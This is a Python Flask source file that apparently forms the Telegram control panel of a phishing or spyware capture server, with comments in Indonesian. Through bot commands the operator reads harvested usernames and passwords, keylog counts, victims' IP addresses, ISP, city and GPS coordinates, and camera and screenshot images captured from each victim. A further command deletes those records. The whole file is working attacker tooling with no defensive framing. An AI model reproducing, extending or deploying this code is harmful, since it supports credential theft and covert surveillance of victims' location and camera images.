from flask import Blueprint, request, jsonify
from app.config import Config
from app.database import db
from app.models import Session as SessionModel, Event, BurstPhoto, Keylog, Credential
from app.routes.capture import send_telegram_text, send_telegram_photo
import os

bp = Blueprint("tg_hook", __name__)


@bp.route("/webhook", methods=["POST"])
def webhook():
    update = request.get_json(silent=True) or {}
    msg = update.get("message") or {}
    text = (msg.get("text") or "").strip()
    
    # ==== Forward ke key_handler kalau command minta key ====
    key_commands = (
        "/key", "/keys", "/editor-key", "/getkey",
        "/link", "/editor-link",
        "/reset", "/status", "/help", "/start",
        "/restart", "/reload", "/reboot",
        "/uptime", "/up",
        "/sysinfo", "/sys", "/info",
        "/tunnel", "/url"
    )
    if text and (text in key_commands or text.startswith("/key ") or text.startswith("/editor")):
        try:
            from app.routes.key_handler import key_webhook
            return key_webhook()
        except Exception as e:
            print(f"[key_handler forward] {e}")

    if text in ("/start", "/help"):
        send_telegram_text("<b>Perintah:</b>\n/list /get /del /stats /creds")
        return jsonify({"ok": True})

    if text == "/stats":
        send_telegram_text(
            "<b>Statistik</b>\n"
            "Total sesi: " + str(SessionModel.query.count()) + "\n"
            "Keylog: " + str(Keylog.query.count()) + "\n"
            "Credentials: " + str(Credential.query.count())
        )
        return jsonify({"ok": True})

    if text == "/creds":
        rows = Credential.query.order_by(Credential.id.desc()).limit(20).all()
        if not rows:
            send_telegram_text("Belum ada credential.")
        else:
            lines = ["<b>Credentials:</b>"]
            for r in rows:
                lines.append("<code>" + (r.username or "") + " : " + (r.password or "") + "</code>")
            send_telegram_text("\n".join(lines))
        return jsonify({"ok": True})

    if text == "/list":
        rows = SessionModel.query.order_by(SessionModel.id.desc()).limit(10).all()
        lines = ["<b>Sesi Terbaru:</b>"]
        for r in rows:
            lines.append("- <code>" + r.ts + "</code> " + (r.city or "?") + ", " + (r.region or "?"))
        send_telegram_text("\n".join(lines) if rows else "Belum ada sesi.")
        return jsonify({"ok": True})

    if text.startswith("/get "):
        ts = text.split(" ", 1)[1].strip()
        r = SessionModel.query.filter_by(ts=ts).first()
        if not r:
            send_telegram_text("Sesi tidak ditemukan.")
            return jsonify({"ok": True})
        info = ("<b>Sesi " + ts + "</b>\nIP: " + str(r.ip_publik or r.ip_koneksi) +
                "\nKota: " + str(r.city) + ", " + str(r.region) +
                "\nISP: " + str(r.isp) + "\nGPS: " + str(r.lat) + "," + str(r.lon))
        send_telegram_text(info)
        for suffix in ["depan", "belakang", "screenshot"]:
            folder = Config.SCREENSHOT_DIR if suffix == "screenshot" else Config.UPLOAD_DIR
            fp = os.path.join(folder, ts + "_" + suffix + ".png")
            if os.path.isfile(fp):
                with open(fp, "rb") as f:
                    send_telegram_photo(f.read(), suffix + " - " + ts)
        return jsonify({"ok": True})

    if text.startswith("/del "):
        ts = text.split(" ", 1)[1].strip()
        for folder in [Config.UPLOAD_DIR, Config.SCREENSHOT_DIR, Config.BURST_DIR]:
            if os.path.isdir(folder):
                for f in os.listdir(folder):
                    if f.startswith(ts):
                        try: os.remove(os.path.join(folder, f))
                        except: pass
        SessionModel.query.filter_by(ts=ts).delete()
        Event.query.filter_by(session_ts=ts).delete()
        BurstPhoto.query.filter_by(session_ts=ts).delete()
        Keylog.query.filter_by(session_ts=ts).delete()
        Credential.query.filter_by(session_ts=ts).delete()
        db.session.commit()
        send_telegram_text("Sesi " + ts + " dihapus.")
        return jsonify({"ok": True})

    return jsonify({"ok": True})
